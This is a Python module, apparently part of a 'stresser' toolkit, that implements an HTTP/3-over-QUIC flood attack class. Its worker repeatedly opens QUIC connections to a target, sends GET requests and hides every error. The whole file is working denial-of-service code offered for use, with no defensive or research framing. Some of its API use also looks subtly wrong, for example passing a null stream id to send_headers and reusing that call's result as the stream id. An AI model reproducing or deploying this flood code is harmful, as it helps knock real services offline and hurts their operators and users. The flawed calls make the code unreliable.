import asyncio
import threading
from .base import AttackBase
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived

class QUICFlood(AttackBase):
    """HTTP/3 over QUIC flood."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.loop = None
        
    async def _quic_worker(self):
        configuration = QuicConfiguration(alpn_protocols=["h3"])
        async with connect(self.target, self.port, configuration=configuration) as protocol:
            h3_conn = H3Connection(protocol._quic)
            # Send request
            stream_id = h3_conn.send_headers(
                stream_id=None,
                headers=[(":method", "GET"), (":path", "/"), (":scheme", "https"),
                         (":authority", self.target), ("user-agent", "stresser")]
            )
            h3_conn.send_data(stream_id, b"", end_stream=True)
            # Wait for response (or just close)
            await asyncio.sleep(0.1)
            h3_conn.close()
            return 0
            
    def worker(self):
        try:
            asyncio.run(self._quic_worker())
        except:
            pass
        return 0